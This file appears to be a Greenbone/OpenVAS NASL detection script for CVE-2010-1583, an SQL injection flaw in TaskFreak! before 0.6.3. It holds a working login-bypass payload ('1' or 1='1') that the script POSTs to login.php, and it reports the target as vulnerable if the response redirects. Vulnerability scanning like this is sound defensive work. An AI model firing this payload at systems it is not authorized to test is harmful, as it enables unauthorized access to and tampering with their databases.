# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:taskfreak:taskfreak%21";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902052");
  script_version("2021-10-04T10:24:39+0000");
  script_tag(name:"last_modification", value:"2021-10-05 10:29:01 +0000 (Tue, 05 Oct 2021)");
  script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-1583");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TaskFreak! < 0.6.3 SQLi Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_taskfreak_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("taskfreak/http/detected");

  script_tag(name:"summary", value:"TaskFreak! is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists due to the error in 'loadByKey()', which fails
  to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view, add,
  modify or delete information in the back-end database.");

  script_tag(name:"affected", value:"TaskFreak! prior to version 0.6.3.");

  script_tag(name:"solution", value:"Update to version 0.6.3 or later.");

  script_xref(name:"URL", value:"http://www.madirish.net/?article=456");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58241");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12452");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/login.php";
data = "username=+%221%27+or+1%3D%271%22++";
referer = http_report_vuln_url(port: port, url: url, url_only: TRUE);
headers = make_array("Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers, referer_url: referer);
res = http_keepalive_send_recv(port: port, data: req);

if ("Location: index.php?" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
